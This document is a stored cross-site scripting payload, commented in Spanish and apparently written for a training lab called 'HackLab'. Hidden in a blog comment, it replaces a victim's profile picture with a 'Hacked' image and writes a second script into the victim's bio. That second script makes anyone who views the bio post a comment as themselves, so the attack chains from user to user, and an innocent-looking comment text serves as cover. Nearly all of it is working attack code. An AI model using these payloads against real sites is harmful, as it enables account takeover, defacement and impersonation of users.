// Payload XSS1 para el comentario (ejecuta en Pepe al visitar /comments: actualiza su pic a "Hacked" + bio con XSS2 para Jeni)
<script>
// Crea canvas para imagen "Hacked"
var canvas = document.createElement('canvas');
canvas.width = 150;
canvas.height = 150;
var ctx = canvas.getContext('2d');
ctx.fillStyle = 'black';
ctx.fillRect(0, 0, 150, 150);
ctx.fillStyle = 'red';
ctx.font = 'bold 30px sans-serif';
ctx.fillText('Hacked', 20, 85);

// XSS2 para bio: POST comentario como Jeni
var xss2 = '<script>var fd = new FormData(); fd.append("comentario", "¡Hola HackLab! Soy jeni comentando desde biografías. #XSSChain"); fetch("/comments", {method: "POST", body: fd}).then(() => console.log("Comentario de Jeni enviado!")); </script><p>Curiosidad + código = poder. Experto en Ciberseguridad. (Actualizado por hacklab)</p>';
// Convertir canvas a Blob y enviar update
canvas.toBlob(function(blob) {
var formData = new FormData();
formData.append('bio', xss2);
formData.append('profile_pic', blob, 'hacked.jpg');
fetch('/profile', {
method: 'POST',
body: formData
}).then(r => {
if (r.ok) console.log('✅ Perfil de Pepe hackeado: Pic + Bio actualizados');
}).catch(err => console.error('Error:', err));
}, 'image/jpeg');
</script>
Comentario inocuo: "Gran post sobre ciberseguridad, @pepe!"
